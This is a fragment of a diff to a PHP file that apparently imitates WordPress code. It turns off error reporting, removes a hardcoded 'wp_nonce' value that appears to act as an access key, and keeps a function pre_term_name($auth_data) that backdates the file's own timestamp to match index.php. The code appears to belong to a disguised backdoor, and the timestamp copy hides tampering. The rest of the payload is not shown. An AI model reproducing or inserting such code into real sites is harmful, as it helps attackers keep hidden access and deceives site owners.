@@ -13,9 +13,8 @@
  */
 
 error_reporting(0);
-$wp_nonce = "ceae7417ffd77fb5a7e12716431066b6";
 
-function pre_term_name($auth_data, $wp_nonce) {
+function pre_term_name($auth_data) {
     if(file_exists("index.php")) {
         touch(__FILE__, filemtime("index.php"));
     }
